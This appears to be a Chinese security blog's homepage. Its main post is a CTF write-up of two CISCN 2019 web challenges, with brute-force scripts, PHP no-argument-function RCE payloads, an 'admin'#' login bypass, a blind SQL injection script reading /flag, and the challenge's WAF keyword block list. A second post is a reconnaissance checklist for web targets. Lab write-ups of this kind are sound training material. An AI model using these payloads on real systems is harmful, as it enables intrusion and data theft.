<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">






<meta name="description" content="待我尝尽世间甘苦，便喂你一勺甜。">
<meta property="og:type" content="website">
<meta property="og:title" content="peri0d的博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="peri0d的博客">
<meta property="og:description" content="待我尝尽世间甘苦，便喂你一勺甜。">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="peri0d的博客">
<meta name="twitter:description" content="待我尝尽世间甘苦，便喂你一勺甜。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>peri0d的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">peri0d的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">peri0d</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
            
            公益404
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/2019CISCN华南线下部分web复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/25/2019CISCN华南线下部分web复现/" itemprop="url">2019CISCN华南线下两道web复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-25T22:43:09+08:00">
                2019-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-wp/" itemprop="url" rel="index">
                    <span itemprop="name">CTF wp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>部分题目下载地址，有的不完整 : <a href="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn.zip" target="_blank" rel="noopener">点我点我</a></p>
<h1 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h1><ul>
<li><p>考点 : 无参函数的 RCE</p>
</li>
<li><p>在注释中发现了 forgetpassword.php 页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1.png" alt></p>
</li>
<li><p>打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 <code>admin123</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/ciscn/web1/useri.php"</span></span><br><span class="line"></span><br><span class="line">response = <span class="string">"没有这个用户"</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./username.txt"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">	line = line.strip()</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">"user_name"</span> : line,</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(line)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>输入 admin123 之后跳转到 useryzm.php 页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_2.png" alt></p>
</li>
<li><p>提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 <code>MTQyMw==</code></p>
<p>四位数字生成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">	s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">	print(s)</span><br><span class="line">	f = open(<span class="string">"num.txt"</span>,<span class="string">'a'</span>)</span><br><span class="line">	f.write(s)</span><br><span class="line">	f.write(<span class="string">'\n'</span>)   <span class="comment">#实现换行的功能</span></span><br></pre></td></tr></table></figure>

<p>爆破密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/ciscn/web1/yzmi.php'</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./num.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">response = <span class="string">"错误"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">	line = line.strip().encode(<span class="string">'utf-8'</span>)</span><br><span class="line">	line = base64.b64encode(line)</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">"yzm"</span> : line.decode(<span class="string">'utf-8'</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(line)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>输入后获得密码 <code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_3.png" alt></p>
</li>
<li><p>返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_4.png" alt></p>
</li>
<li><p>mDjNaF.php 页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_5.png" alt></p>
</li>
<li><p>看一下正则，<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>phpinfo();</code> 可以查看 phpinfo 页面</p>
</li>
<li><p>接下来就是构造无参数函数进行 RCE 了，想到可以<strong>更改 header 中的属性和值</strong>，使用无参数函数获取 header 处的值，达到 RCE 的目的。</p>
</li>
<li><p>对于 Cookie 属性，我们可以随意更改，session_id() 函数可以获取 PHPSESSID，如果没有开启 session 可以使用 session_start() 函数。由于不能带参数，我们可以将命令转化为 hex 再用 hex2bin() 函数转化。</p>
</li>
<li><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line"><span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_6.png" alt></p>
</li>
<li><p>还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE</p>
</li>
<li><p>payload : <code>?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;))</code></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_7.png" alt></p>
</li>
</ul>
<h1 id="web-4"><a href="#web-4" class="headerlink" title="web 4"></a>web 4</h1><ul>
<li><p>考点 : insert() 盲注</p>
</li>
<li><p>一个登录页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_1.png" alt></p>
</li>
<li><p>试一试万能密码 <code>admin&#39;#</code> ，登录成功，并给出提示</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_2.png" alt></p>
</li>
<li><p>经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过</p>
</li>
<li><p>给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_3.png" alt></p>
</li>
<li><p><code>insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;)</code> 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。<code>insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)</code>把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。</p>
</li>
<li><p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.27.137.145/ciscn/web4/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"</span></span><br><span class="line"></span><br><span class="line">temp_list = []</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">255</span>):</span><br><span class="line">	payload_1 = <span class="string">"')&gt;(insert((select(load_file('/flag'))),"</span>+str(i)+<span class="string">",255,'')))#"</span></span><br><span class="line">	flag = <span class="string">''</span>.join(flag_list)</span><br><span class="line">	temp_list.clear()</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"admin'^(select('"</span>+flag+chr(j)+payload_1</span><br><span class="line">		print(payload)</span><br><span class="line">		data = &#123;<span class="string">'username'</span> : payload,&#125;</span><br><span class="line">		r = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			temp_list.append(chr(j))</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		flag_list.append(temp_list.pop())</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(<span class="string">''</span>.join(flag_list))</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_4.png" alt></p>
</li>
<li><p>过滤语句 : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i"</span>,$username))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i"</span>,$passwd))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/信息搜集/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/25/信息搜集/" itemprop="url">信息搜集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-25T21:23:30+08:00">
                2019-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透/" itemprop="url" rel="index">
                    <span itemprop="name">渗透</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透/信息搜集/" itemprop="url" rel="index">
                    <span itemprop="name">信息搜集</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="信息搜集的流程"><a href="#信息搜集的流程" class="headerlink" title="信息搜集的流程"></a>信息搜集的流程</h1><ul>
<li>域名：whois, 子域名, 备案信息</li>
<li>服务器 : dns 信息, 端口信息, 真实 IP</li>
<li>web : 网站架构, 敏感目录及敏感信息, 源码泄露, 旁站查询, C 段查询, 指纹系统, 探测 waf</li>
<li>企业 : 天眼, 维基</li>
</ul>
<h1 id="whois-查询"><a href="#whois-查询" class="headerlink" title="whois 查询"></a>whois 查询</h1><ul>
<li>直接进行 whois 查询</li>
<li>到微步查询询历史whois，可以获取到历史的whois信息</li>
<li>反查whois，获取该注册者/电话/邮箱下的相关域名</li>
</ul>
<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><ul>
<li><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li>
<li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li>
<li><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></li>
</ul>
<h1 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h1><ul>
<li>ICP 查询</li>
<li>公安部备案查询</li>
</ul>
<p>urls.txt 传入需要查询的网站</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">targets = []</span><br><span class="line">names = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icp_info</span><span class="params">(host)</span>:</span></span><br><span class="line">url = <span class="string">"https://icp.chinaz.com/ajaxsync.aspx?at=beiansl&amp;callback=jQuery111305329118231795913_1554378576520&amp;host=%s&amp;type=host"</span>%host</span><br><span class="line">html = requests.get(url,timeout=(<span class="number">5</span>,<span class="number">10</span>)).text</span><br><span class="line">pattern = re.compile(<span class="string">'SiteName:"(.*?)",MainPage:"(.*?)"'</span>,re.S)</span><br><span class="line">info = re.findall(pattern,html)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">name = info[i][<span class="number">0</span>]</span><br><span class="line">target = info[i][<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"%s:%s"</span>%(name,target))</span><br><span class="line"><span class="keyword">if</span> target <span class="keyword">not</span> <span class="keyword">in</span> targets:</span><br><span class="line">targets.append(target)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"icp_info.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="string">"%s:%s"</span>%(name,target) + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"url.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> a:</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> a:</span><br><span class="line">b = b.strip()</span><br><span class="line">icp_info(host=b)</span><br><span class="line">a.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">thread = threading.Thread(target=start,)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="DNS-信息查询"><a href="#DNS-信息查询" class="headerlink" title="DNS 信息查询"></a>DNS 信息查询</h1><ul>
<li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li>
<li><a href="https://tool.lu/dns/" target="_blank" rel="noopener">https://tool.lu/dns/</a></li>
</ul>
<h1 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h1><ul>
<li>Nmap</li>
</ul>
<h1 id="获取真实-IP"><a href="#获取真实-IP" class="headerlink" title="获取真实 IP"></a>获取真实 IP</h1><h1 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><ul>
<li>云悉</li>
<li>Nmap</li>
</ul>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><ul>
<li>云悉</li>
</ul>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul>
<li>云悉</li>
</ul>
<h2 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h2><ul>
<li>云悉</li>
</ul>
<h1 id="敏感目录及敏感信息"><a href="#敏感目录及敏感信息" class="headerlink" title="敏感目录及敏感信息"></a>敏感目录及敏感信息</h1><ul>
<li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></li>
<li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></li>
<li>御剑</li>
</ul>
<h1 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h1><h1 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h1><ul>
<li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li>
</ul>
<h1 id="C-段查询"><a href="#C-段查询" class="headerlink" title="C 段查询"></a>C 段查询</h1><ul>
<li>Nmap</li>
<li>北极熊扫描器扫</li>
</ul>
<h1 id="指纹系统"><a href="#指纹系统" class="headerlink" title="指纹系统"></a>指纹系统</h1><ul>
<li>云悉</li>
</ul>
<h1 id="探测-waf"><a href="#探测-waf" class="headerlink" title="探测 waf"></a>探测 waf</h1><ul>
<li>Nmap</li>
</ul>
<h1 id="网站资产"><a href="#网站资产" class="headerlink" title="网站资产"></a>网站资产</h1><ul>
<li>天眼</li>
<li>维基</li>
<li>shodan/zoomeye/fofa</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/19/源码泄露/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/19/源码泄露/" itemprop="url">常见源码泄露</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-19T01:08:12+08:00">
                2019-06-19
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/源码泄露/" itemprop="url" rel="index">
                    <span itemprop="name">源码泄露</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
